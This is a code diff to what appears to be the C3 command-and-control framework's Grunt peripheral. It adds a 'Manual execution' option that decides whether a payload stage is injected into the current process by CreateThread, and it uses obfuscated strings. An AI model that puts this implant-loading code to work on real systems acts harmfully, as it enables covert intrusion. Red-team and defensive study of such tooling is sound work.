@@ -170,7 +170,7 @@ Cleanup:
 FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 {
 
-	auto [pipeName, payload, connectAttempts] = arguments.Read<std::string, ByteVector, uint32_t>();
+	auto [manualExecution, pipeName, payload, connectAttempts] = arguments.Read<std::string, std::string, ByteVector, uint32_t>();
 
 	BYTE *x = (BYTE *)payload.data();
 	SIZE_T len = payload.size();
@@ -184,8 +184,13 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 
 
 	// Inject the payload stage into the current process.
-	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SEH::SehWrapperCov), &args, 0, nullptr))
-		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
+	if (manualExecution != "true"){
+		Log({ OBF_SEC("Automatic grunt execution"), LogMessage::Severity::DebugInformation });
+		if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SEH::SehWrapperCov), &args, 0, nullptr))
+	 		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
+	} else {
+		Log({ OBF_SEC("Manual grunt execution"), LogMessage::Severity::DebugInformation });
+	}
 
 	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give Grunt thread time to start pipe.
 	for (auto i = 0u; i < connectAttempts; i++)
@@ -260,6 +265,12 @@ FSecure::ByteView FSecure::C3::Interfaces::Peripherals::Grunt::GetCapability()
 	{
 		"arguments":
 		[
+			{
+				"type": "string",
+				"name": "Manual execution",
+				"defaultValue" : "true",
+				"description": "Execute grunt manually or automatically."
+			},
 			{
 				"type": "string",
 				"name": "Pipe name",
